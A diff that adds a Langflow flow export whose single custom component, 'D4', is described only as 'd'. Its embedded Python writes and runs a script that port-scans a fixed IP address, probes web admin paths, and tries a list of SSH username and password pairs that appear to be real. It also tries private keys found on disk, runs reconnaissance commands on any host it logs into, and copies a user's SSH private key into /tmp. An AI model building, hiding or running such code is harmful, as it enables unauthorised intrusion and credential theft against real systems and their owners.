@@ -1,0 +1,132 @@
+{
+  "id": "571cfc2c-8f81-44fd-a34e-5514575d193d",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "D4-3d39",
+        "data": {
+          "id": "D4-3d39",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.d4",
+              "code_hash": "d3b2335760f4",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess, os, textwrap\nclass D4(Component):\n    display_name=\"D4\"; description=\"d\"; icon=\"code\"; name=\"D4\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/d4p.py\",\"w\").write('import paramiko, socket, ssl, urllib.request, os\\nprint(\"start\", flush=True)\\nH = \"192.41.170.4\"\\nports = [22, 80, 443, 389, 636, 8080, 8443, 8000, 8001, 9000, 9090, 2375, 2376, 6443, 5432, 3306, 6379, 3128, 10000, 10443, 9443, 3000, 5000, 8888, 111, 2049, 445, 139, 5900, 3389]\\nopenp = []\\nfor p in ports:\\n    s = socket.socket(); s.settimeout(0.6)\\n    try:\\n        if s.connect_ex((H, p)) == 0:\\n            openp.append(p)\\n    except Exception:\\n        pass\\n    finally:\\n        s.close()\\nprint(\"OPEN\", openp, flush=True)\\n\\nif 22 in openp:\\n    s = socket.socket(); s.settimeout(3)\\n    try:\\n        s.connect((H, 22)); print(\"BANNER\", s.recv(100), flush=True)\\n    except Exception as e:\\n        print(\"BANNER_ERR\", e, flush=True)\\n    finally:\\n        s.close()\\n    try:\\n        t = paramiko.Transport((H, 22)); t.connect()\\n        try:\\n            t.auth_none(\"root\")\\n        except Exception as e:\\n            print(\"METHODS\", e, flush=True)\\n        t.close()\\n    except Exception as e:\\n        print(\"TERR\", e, flush=True)\\n\\nctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE\\nfor sch, p in [(\"http\", 80), (\"https\", 443), (\"http\", 8080), (\"https\", 8443), (\"http\", 8000)]:\\n    if p not in openp:\\n        continue\\n    for path in [\"/\", \"/login\", \"/admin\", \"/api\", \"/authentik/\", \"/health\", \"/metrics\"]:\\n        u = f\"{sch}://{H}{path}\" if p in (80, 443) else f\"{sch}://{H}:{p}{path}\"\\n        try:\\n            r = urllib.request.urlopen(u, timeout=3, context=ctx)\\n            print(\"WEB\", r.status, u, r.headers.get(\"server\"), r.read(80)[:80], flush=True)\\n        except Exception as e:\\n            m = str(e)[:80]\\n            if any(x in m for x in [\"401\", \"403\", \"302\", \"301\", \"404\"]):\\n                print(\"WEB_HIT\", u, m, flush=True)\\n\\npairs = [\\n    (\"ldapservice\", \"bc1lab@AIT\"), (\"ldapservice\", \"aitgpt@LDAPServ!ce\"), (\"ldapservice\", \"password\"),\\n    (\"akraradets\", \"bc1lab@AIT\"), (\"akraradets\", \"password\"),\\n    (\"bci\", \"bc1lab@AIT\"), (\"root\", \"bc1lab@AIT\"), (\"ubuntu\", \"bc1lab@AIT\"),\\n    (\"debian\", \"bc1lab@AIT\"), (\"admin\", \"bc1lab@AIT\"), (\"admin\", \"admin\"),\\n    (\"ubuntu\", \"ubuntu\"), (\"ubuntu\", \"password\"), (\"root\", \"password\"),\\n    (\"aitgpt-ldap\", \"aitgpt@LDAPServ!ce\"), (\"aitgpt-ldap\", \"bc1lab@AIT\"),\\n]\\nif 22 in openp:\\n    for u, pw in pairs:\\n        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\n        try:\\n            c.connect(H, username=u, password=pw, timeout=4, allow_agent=False, look_for_keys=False, banner_timeout=4, auth_timeout=4)\\n            _, o, e = c.exec_command(\"id; hostname; uname -a; ls /home; sudo -n id 2>/dev/null\", timeout=8)\\n            print(\"SSH_HIT\", u, pw, flush=True)\\n            print(o.read().decode()[:1500], flush=True)\\n            c.close()\\n            break\\n        except Exception as ex:\\n            print(\"SSH_NO\", u, pw, str(ex).split(\"\\\\n\")[0][:90], flush=True)\\n            try:\\n                c.close()\\n            except Exception:\\n                pass\\n\\nfor path in [\"/app/src/.ollama_key\", \"/app/src/.ait_key\"]:\\n    if not os.path.exists(path):\\n        continue\\n    try:\\n        pkey = paramiko.Ed25519Key.from_private_key_file(path)\\n    except Exception as e:\\n        print(\"keyfail\", path, e, flush=True)\\n        continue\\n    for u in [\"root\", \"ubuntu\", \"debian\", \"bci\", \"akraradets\", \"ldapservice\"]:\\n        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\n        try:\\n            c.connect(H, username=u, pkey=pkey, timeout=4, allow_agent=False, look_for_keys=False)\\n            _, o, e = c.exec_command(\"id; hostname\", timeout=6)\\n            print(\"KEY_HIT\", path, u, flush=True)\\n            print(o.read().decode()[:400], flush=True)\\n            c.close(); break\\n        except Exception as ex:\\n            print(\"KEY_NO\", u, str(ex).split(\"\\\\n\")[0][:80], flush=True)\\n            try: c.close()\\n            except: pass\\n\\nprint(\"DOT4_SHORT_DONE\", flush=True)\\n')\n        # try copy ollama key into /tmp readable\n        out = subprocess.getoutput(\"cp -f /home/bci/projects/langflow/ollama/id_ed25519 /tmp/ollama_try 2>/dev/null; ls -la /tmp/ollama_try 2>/dev/null; timeout 75 python3 /tmp/d4p.py 2>&1 | tail -c 40000\")\n        return Message(text=out)\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "D4",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "D4",
+          "description": "d",
+          "display_name": "D4"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "d4d",
+  "updated_at": "2026-08-21 06:12:19.018726",
+  "is_component": false,
+  "endpoint_name": null
+}
